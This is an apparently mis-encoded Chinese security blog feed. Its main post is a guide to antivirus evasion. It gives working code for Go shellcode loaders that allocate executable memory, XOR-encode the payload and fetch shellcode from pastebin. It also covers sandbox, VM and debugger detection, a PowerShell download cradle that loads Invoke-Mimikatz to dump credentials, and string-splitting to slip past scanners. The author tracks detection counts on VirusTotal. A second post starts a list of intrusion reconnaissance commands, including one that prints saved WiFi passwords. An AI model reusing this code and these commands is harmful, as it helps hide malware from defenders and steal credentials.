title="æ£€æµ‹çˆ¶è¿›ç¨‹"></a>æ£€æµ‹çˆ¶è¿›ç¨‹</h5><p>å¯¹äºä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·æ¥è¯´ï¼Œå¯åŠ¨exeæ–‡ä»¶åº”è¯¥æ˜¯åŒå‡»è¿è¡Œï¼Œç¨‹åºå¯åŠ¨åçˆ¶è¿›ç¨‹æ˜¯explore.exeï¼Œå¦‚æœæ˜¯cmdè¿è¡Œåˆ™ä¼šæ˜¯cmd.exeã€<br>ä½†æ˜¯å¯¹äºæ²™ç®±å°±æœ‰å¯èƒ½å­˜åœ¨ç”¨ä¸€ä¸ªç¨‹åºå¦‚windbgæ¥å¯åŠ¨æˆ‘ä»¬çš„æ¶æ„EXEæ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¯¹æ­¤ç‚¹è¿›è¡Œæ£€æµ‹ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD GetParentPID(DWORD pid)</span><br><span class="line">&#123;</span><br><span class="line">DWORD ppid &#x3D; 0;</span><br><span class="line">PROCESSENTRY32W processEntry &#x3D; &#123; 0 &#125;;</span><br><span class="line">processEntry.dwSize &#x3D; sizeof(PROCESSENTRY32W);</span><br><span class="line">HANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  &#x2F;&#x2F;å¯¹æ‰€æœ‰è¿›ç¨‹åˆ›å»ºå¿«ç…§</span><br><span class="line">if (Process32FirstW(hSnapshot, &amp;processEntry))  &#x2F;&#x2F;éå†å¿«ç…§ï¼Œæ‰¾åˆ°å½“å‰ä¼ å…¥PIDçš„è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">&#123;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">if (processEntry.th32ProcessID &#x3D;&#x3D; pid)</span><br><span class="line">&#123;</span><br><span class="line">ppid &#x3D; processEntry.th32ParentProcessID;  &#x2F;&#x2F;æ‰¾åˆ°å¹¶è¿”å›ä¼ å…¥PIDçš„çˆ¶è¿›ç¨‹PID</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125; while (Process32NextW(hSnapshot, &amp;processEntry));</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">return ppid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">DWORD parentPid &#x3D; GetParentPID(GetCurrentProcessId()); &#x2F;&#x2F;è·å–å½“å‰è¿›ç¨‹çˆ¶è¿›ç¨‹PID</span><br><span class="line">WCHAR parentName[MAX_PATH + 1];</span><br><span class="line">DWORD dwParentName &#x3D; MAX_PATH;</span><br><span class="line">HANDLE hParent &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);  &#x2F;&#x2F;æ‰“å¼€çˆ¶è¿›ç¨‹</span><br><span class="line">QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); &#x2F;&#x2F; another way to get process name is to use &#39;Toolhelp32Snapshot&#39; &#x2F;&#x2F;è·å–è¿›ç¨‹å</span><br><span class="line">CharUpperW(parentName);</span><br><span class="line">if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return; &#x2F;&#x2F;åŒ¹é…</span><br><span class="line"></span><br><span class="line">wprintf_s(L&quot;Now hacking...\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿›ç¨‹é•‚ç©º"><a href="#è¿›ç¨‹é•‚ç©º" class="headerlink" title="è¿›ç¨‹é•‚ç©º"></a>è¿›ç¨‹é•‚ç©º</h3><h3 id="åŠ¨æ€è°ƒç”¨API"><a href="#åŠ¨æ€è°ƒç”¨API" class="headerlink" title="åŠ¨æ€è°ƒç”¨API"></a>åŠ¨æ€è°ƒç”¨API</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* ntAllocateVirtualMemory &#x3D; GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);</span><br></pre></td></tr></table></figure><h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><h3 id="è¿œç¨‹æ‰§è¡Œä¸æœ¬åœ°æ‰§è¡Œ"><a href="#è¿œç¨‹æ‰§è¡Œä¸æœ¬åœ°æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹æ‰§è¡Œä¸æœ¬åœ°æ‰§è¡Œ"></a>è¿œç¨‹æ‰§è¡Œä¸æœ¬åœ°æ‰§è¡Œ</h3><h4 id="è¿œç¨‹æ‰§è¡Œ"><a href="#è¿œç¨‹æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹æ‰§è¡Œ"></a>è¿œç¨‹æ‰§è¡Œ</h4><p>powershellå¯ä»¥åŠ è½½è¿œç¨‹çš„ps1æ–‡ä»¶ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å®ç°äº†æ— æ–‡ä»¶è½åœ°ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡å¸‚é¢ä¸Šå¾ˆå¤šæ€è½¯å¯¹downloadstringæ£€æµ‹ååˆ†ååˆ†ä¸¥æ ¼(è®¸å¤šä¼šæ£€æµ‹è¿œç¨‹æ–‡ä»¶å®‰å…¨æ€§ï¼‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1 (smb)</span><br></pre></td></tr></table></figure><h4 id="æœ¬åœ°æ‰§è¡Œ"><a href="#æœ¬åœ°æ‰§è¡Œ" class="headerlink" title="æœ¬åœ°æ‰§è¡Œ"></a>æœ¬åœ°æ‰§è¡Œ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\xx.ps1</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤æ‹†åˆ†"><a href="#å‘½ä»¤æ‹†åˆ†" class="headerlink" title="å‘½ä»¤æ‹†åˆ†"></a>å‘½ä»¤æ‹†åˆ†</h3><p>å°±åƒåˆšåˆšè¿œç¨‹åŠ è½½çš„downloadstringæ³•ï¼Œå®ƒå¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹†åˆ†é‡ç»„ç»•è¿‡ä¸€äº›æ€è½¯æ£€æµ‹ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure><h1 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h1><h2 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h2><p>å¾ˆæœ‰è¶£çš„ä¸€ä»¶äº‹æ˜¯ï¼Œç”¨goè¯­è¨€å†™ä¸ªhelloworldä¼ åˆ°vtè¢«14å®¶æ€,ç‰›æ‰¹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819215802696.png" alt="image-20210819215802696"></p><h2 id="ç”ŸæˆEXE"><a href="#ç”ŸæˆEXE" class="headerlink" title="ç”ŸæˆEXE"></a>ç”ŸæˆEXE</h2><p>go ç¼–è¯‘ä¸ºEXE çš„åšæ³•æ˜¯<strong>go build</strong> â€¦.goï¼Œä½†è¿™æ ·EXEæ‰“å¼€æ—¶ä¼šæœ‰ä¸ªé»‘æ¡†</p><p>go build -ldflags â€œ-H windowsguiâ€ ..go  ç”Ÿæˆæ— çª—å£EXEï¼Œä½†è¿™æ ·ä¼šå¢åŠ æ€è½¯çš„æŸ¥æ€åº¦</p><h2 id="ç”³è¯·å†…å­˜åŠ è½½shellcode"><a href="#ç”³è¯·å†…å­˜åŠ è½½shellcode" class="headerlink" title="ç”³è¯·å†…å­˜åŠ è½½shellcode"></a>ç”³è¯·å†…å­˜åŠ è½½shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;syscall&quot;</span><br><span class="line">&quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">MEM_COMMIT             &#x3D; 0x1000</span><br><span class="line">MEM_RESERVE            &#x3D; 0x2000</span><br><span class="line">PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; åŒºåŸŸå¯ä»¥æ‰§è¡Œä»£ç ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥è¯»å†™è¯¥åŒºåŸŸã€‚</span><br><span class="line">KEY_1                  &#x3D; 55</span><br><span class="line">KEY_2                  &#x3D; 66</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">kernel32      &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">ntdll         &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;)</span><br><span class="line">VirtualAlloc  &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;)</span><br><span class="line">RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main()&#123;</span><br><span class="line">shellcode:&#x3D;[]byte&#123;0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d&#125;</span><br><span class="line">addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åŸå§‹ç‰ˆæœ¬,è¢«æ€æˆå“ˆæ‰¹ï¼Œä½†å³ä½¿è¿™æ ·360ä¹Ÿæ€ä¸å‡ºæ¥ï¼Œå¯ä»¥çœ‹å‡ºç»•è¿‡360æœ‰æ‰‹å°±è¡Œ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818180146046.png" alt="image-20210818180146046"></p><h2 id="ç®€å•XOR"><a href="#ç®€å•XOR" class="headerlink" title="ç®€å•XOR"></a>ç®€å•XOR</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xoræ¨¡å—ï¼ˆè·å¾—xoråçš„shellcodeï¼‰</span><br><span class="line">for i:&#x3D;0;i&lt;len(shellcode);i++&#123;</span><br><span class="line">fmt.Print(&quot;0x&quot;,strconv.FormatInt(int64(shellcode[i]^123),16),&quot;,&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor_shellcode:&#x3D;[]byte&#123;xored_shellcode&#125;</span><br><span class="line">var shellcode []byte</span><br><span class="line">for i:&#x3D;0;i&lt;len(xor_shellcode);i++&#123;</span><br><span class="line">shellcode&#x3D;append(shellcode,xor_shellcode[i]^123)</span><br><span class="line">&#125;</span><br><span class="line">addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">syscall.Exit(0)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, 0, 0, 0, 0)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818185018219.png" alt="image-20210818185018219"></p><p>å¥½äº†ç‚¹ï¼Œä½†æ˜¯å¦‚æœåŠ ä¸Šæ— æ¡†å¯åŠ¨ï¼Œè¿˜æ˜¯ä¼šè¢«æ€æˆå“ˆæ‰¹</p><h2 id="æ²™ç›’-amp-è™šæ‹Ÿæœºæ£€æµ‹"><a href="#æ²™ç›’-amp-è™šæ‹Ÿæœºæ£€æµ‹" class="headerlink" title="æ²™ç›’&amp;è™šæ‹Ÿæœºæ£€æµ‹"></a>æ²™ç›’&amp;è™šæ‹Ÿæœºæ£€æµ‹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imoprt&#123;&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;host&quot;</span><br><span class="line">&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;mem&quot;</span><br><span class="line">&quot;github.com&#x2F;shirou&#x2F;gopsutil&#x2F;disk&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckTime() bool&#123;</span><br><span class="line">timeBoot, _ :&#x3D; host.BootTime()</span><br><span class="line">t :&#x3D; time.Unix(int64(timeBoot), 0)</span><br><span class="line">timeNow:&#x3D;time.Now()</span><br><span class="line">ts:&#x3D;timeNow.Sub(t)</span><br><span class="line">if ts.Minutes()&lt;12&#123;</span><br><span class="line">return false</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckName() bool&#123;</span><br><span class="line">files, _ :&#x3D; ioutil.ReadDir(&quot;.&#x2F;&quot;)</span><br><span class="line">for _, f :&#x3D; range files &#123;</span><br><span class="line">if f.Name()&#x3D;&#x3D;&quot;ActiveX.exe&quot;&#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func CheckSystem() bool&#123;</span><br><span class="line">info1,_:&#x3D;mem.SwapMemory()</span><br><span class="line">info2,_:&#x3D;mem.VirtualMemory()</span><br><span class="line">disk,_:&#x3D;disk.Usage(&quot;c:&quot;)</span><br><span class="line">if(runtime.NumCPU()&lt;2&amp;&amp;info1.Total&lt;2147483648&amp;&amp;info2.Total&lt;2147483648&amp;&amp;disk.Total&lt;21474836480)&#123;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818192335970.png" alt="image-20210818192335970"></p><p>ç”¨å®ƒå’ŒXORæ‰“ç»„åˆæ‹³æ•ˆæœå°†å°±ï¼Œç”¨äº†æ— çª—å¯åŠ¨åæœ‰7ä¸ªæŸ¥å‡ºæ¥</p><h3 id="è™šæ‹Ÿæœºï¼šæ•æ„Ÿæ–‡ä»¶æ£€æµ‹"><a href="#è™šæ‹Ÿæœºï¼šæ•æ„Ÿæ–‡ä»¶æ£€æµ‹" class="headerlink" title="è™šæ‹Ÿæœºï¼šæ•æ„Ÿæ–‡ä»¶æ£€æµ‹"></a>è™šæ‹Ÿæœºï¼šæ•æ„Ÿæ–‡ä»¶æ£€æµ‹</h3><p>è¿™ä¸ªä¼šè¢«defenderæ‹¦ï¼Œä¸å¿…è¦çš„è¯ä¸ç”¨è¿™ä¸ª</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func PathExists(path string) (bool, error) &#123; &#x2F;&#x2F;åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class="line">_, err :&#x3D; os.Stat(path)</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">return true, nil</span><br><span class="line">&#125;</span><br><span class="line">if os.IsNotExist(err) &#123;</span><br><span class="line">return false, nil</span><br><span class="line">&#125;</span><br><span class="line">return false, err</span><br><span class="line">&#125;</span><br><span class="line">func fack(path string) &#123; &#x2F;&#x2F;åˆ¤æ–­è™šæ‹Ÿæœºå…³é”®æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class="line">b, _ :&#x3D; PathExists(path)</span><br><span class="line">if b &#123;</span><br><span class="line">fmt.Printf(&quot;å½“å‰æ˜¯è™šæ‹Ÿæœºç¯å¢ƒï¼Œåˆ«åˆ†æäº†ï¼Œå“¥ã€‚&quot;)</span><br><span class="line">os.Exit(1) &#x2F;&#x2F;å¦‚æœæ˜¯è™šæ‹Ÿæœºå°±é€€å‡ºå½“å‰è¿›ç¨‹</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func check() &#123;</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxdisp.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxhook.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxservice.exe&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\vboxtray.exe&quot;)</span><br><span class="line">fack(&quot;C:\\windows\\System32\\VBoxControl.exe&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è¿œç¨‹è¯»shellcode"><a href="#è¿œç¨‹è¯»shellcode" class="headerlink" title="è¿œç¨‹è¯»shellcode"></a>è¿œç¨‹è¯»shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Url,err:&#x3D;url.Parse(&quot;https:&#x2F;&#x2F;pastebin.com&#x2F;aa&quot;)</span><br><span class="line">if err!&#x3D;nil&#123;</span><br><span class="line">panic(&quot;error&quot;)</span><br><span class="line">&#125;</span><br><span class="line">client:&#x3D;http.Client&#123;&#125;</span><br><span class="line">req,_:&#x3D;http.NewRequest(&quot;GET&quot;,Url.String(),nil)</span><br><span class="line">req.Header.Add(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36&quot;)</span><br><span class="line">req.Header.Add(&quot;Cookie&quot;,&quot;SUB&#x3D;_2 SUBP&#x3D;00&quot;)</span><br><span class="line">resp,_:&#x3D;client.Do(req)</span><br><span class="line">body,_:&#x3D;ioutil.ReadAll(resp.Body)  &#x2F;&#x2F;stringå½¢å¼è·å–äº†é¡µé¢å†…å®¹,ä»¥ä¸Šä»£ç ä¸ºä¸»ä½“éƒ¨åˆ†</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;é€šè¿‡ä¸€ç³»åˆ—æ­£åˆ™åŒ¹é…,å­—ç¬¦ä¸²æˆªå–ç­‰æ–¹æ³•ä»é¡µé¢ä¸­å¾—åˆ°shellcode(é¡µé¢ä¸­æˆ‘çš„shellcodeæ˜¯è¿™æ ·çš„rngrngfc,48,....,aalgdlgd)</span><br><span class="line">re:&#x3D;regexp.MustCompile(&#96;rngrng.*lgdlgd&#96;)</span><br><span class="line">match:&#x3D;re.FindString(string(body))</span><br><span class="line">match&#x3D;match[6:len(match)-6]</span><br><span class="line">return match</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ‹–ä¸‹æ¥çš„shellcodeæ˜¯stringæ ¼å¼ï¼Œæˆ‘ä»¬éœ€è¦æŠŠä»–è½¬ä¸º[]byte</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func aa(encodes string) []byte&#123;</span><br><span class="line">var xor_shellcode []byte</span><br><span class="line">spi:&#x3D;&quot;,&quot;</span><br><span class="line">enc:&#x3D;strings.Split(encodes,spi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i,_ :&#x3D;range enc&#123;</span><br><span class="line">tmps,_:&#x3D;hex.DecodeString(enc[i])</span><br><span class="line">if(len(tmps)&gt;0) &#123;</span><br><span class="line">xor_shellcode &#x3D; append(xor_shellcode, tmps[0])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return xor_shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿œç¨‹+XOR+æ²™ç®± åè€Œè¢«æ€çš„æ›´å¤šâ€¦çœ‹æ¥è¿™ä¸ªHTTPå‡½æ•°è¢«æŠ“çš„å¾ˆç´§ï¼Œè¿˜è¢«360æ€å‡ºæ¥äº†</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818233352655.png" alt="image-20210818233352655"></p><h2 id="è¯»å–æ–‡ä»¶ä¸­çš„SHELLCODE"><a href="#è¯»å–æ–‡ä»¶ä¸­çš„SHELLCODE" class="headerlink" title="è¯»å–æ–‡ä»¶ä¸­çš„SHELLCODE"></a>è¯»å–æ–‡ä»¶ä¸­çš„SHELLCODE</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var sc []byte</span><br><span class="line">bytes,_:&#x3D;ioutil.ReadFile(&quot;C:\\Users\\xx\\Desktop\\sc.txt&quot;)</span><br><span class="line">tmp:&#x3D;strings.Split(string(bytes),&quot;,&quot;)</span><br><span class="line">for i,_ :&#x3D;range tmp&#123;</span><br><span class="line">tmps,_:&#x3D;hex.DecodeString(tmp[i])</span><br><span class="line">if(len(tmps)&gt;0) &#123;</span><br><span class="line">sc &#x3D; append(sc, tmps[0])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819212634402.png" alt="image-20210819212634402"></p><p>å¯ä»¥</p><h2 id="æ–‡ä»¶é‡Šæ”¾"><a href="#æ–‡ä»¶é‡Šæ”¾" class="headerlink" title="æ–‡ä»¶é‡Šæ”¾"></a>æ–‡ä»¶é‡Šæ”¾</h2><p>åœ¨æˆ‘ä»¬æœ¨é©¬è¿è¡Œæ—¶å¯ä»¥é‡Šæ”¾ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶å¹¶è¿è¡Œï¼Œè¾¾åˆ°DLLåŠ«æŒæˆ–è€…è¿·æƒ‘è§†å¬çš„ä½œç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è·å–æ–‡ä»¶å†…å®¹</span><br><span class="line">file,_:&#x3D;os.Open(&quot;E:\\tools\\shell\\cobaltstrike4.3\\cobaltstrike.exe&quot;)</span><br><span class="line">fi,_:&#x3D;file.Stat()</span><br><span class="line">size:&#x3D;fi.Size()</span><br><span class="line">data :&#x3D; make([]byte, size)</span><br><span class="line">file.Read(data)</span><br><span class="line">for _,i:&#x3D;range data&#123;</span><br><span class="line">fmt.Print(strconv.Itoa(int(i))+&quot;,&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‰é¢çš„è¯:â€å…æ€ä¸€èˆ¬éƒ½æ˜¯é ç»„åˆæ‹³â€&lt;/p&gt;
&lt;h1 id=&quot;EXE&quot;&gt;&lt;a href=&quot;#EXE&quot; class=&quot;headerlink&quot; title=&quot;EXE&quot;&gt;&lt;/a&gt;EXE&lt;/h1&gt;&lt;h3 id=&quot;åŠ å£³&quot;&gt;&lt;a href=&quot;#åŠ å£³&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
    <category term="ç³»ç»Ÿç›¸å…³ä¸å…æ€" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Windowså†…ç½‘æ¸—é€å¸¸ç”¨å‘½ä»¤æ€»æ±‡</title>
    <link href="http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/"/>
    <id>http://const27.com/2021/09/03/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/</id>
    <published>2021-09-03T13:07:23.349Z</published>
    <updated>2021-09-03T13:18:16.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><p>å‰å‡ å¤©é¢è¯•çš„æ—¶å€™è¢«å¸ˆå‚…é—®åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶ä¸æ˜¯å¾ˆä¼šï¼Œç°åœ¨æ¥å­¦å­¦</p><h3 id="æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯"><a href="#æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯"></a>æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯</h3><p>ipconfig /all</p><h3 id="æŸ¥è¯¢æœ¬æœºçš„æœåŠ¡ä¿¡æ¯"><a href="#æŸ¥è¯¢æœ¬æœºçš„æœåŠ¡ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢æœ¬æœºçš„æœåŠ¡ä¿¡æ¯"></a>æŸ¥è¯¢æœ¬æœºçš„æœåŠ¡ä¿¡æ¯</h3><p>wmic service list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010533168.png" alt="image-20210217010533168"></p><h3 id="æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯"><a href="#æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯"></a>æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯</h3><p>systeminfo</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010547050.png" alt="image-20210217010547050"></p><h3 id="è¿æ¥è¿‡çš„WIFIåŠå¯†ç "><a href="#è¿æ¥è¿‡çš„WIFIåŠå¯†ç " class="headerlink" title="è¿æ¥è¿‡çš„WIFIåŠå¯†ç "></a>è¿æ¥è¿‡çš„WIFIåŠå¯†ç </h3><ol><li>for /f â€œskip=9 tokens=1,2 delims=:â€ %i in (â€˜netsh wlan show profilesâ€™) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</li></ol><h3 id="æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨"><a href="#æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨" class="headerlink" title="æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨"></a>æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</h3><p>tasklist / wmic process list brief</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010556587.png" alt="image-20210217010556587"></p><h3 id="æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h3><p>schtasks /query /fo LIST /v åˆ—å‡ºè®¡åˆ’ä»»åŠ¡è¯¦ç»†ä¿¡æ¯</p><h3 id="æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"><a href="#æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´" class="headerlink" title="æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"></a>æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</h3><p>net statistics workstation</p><p><img 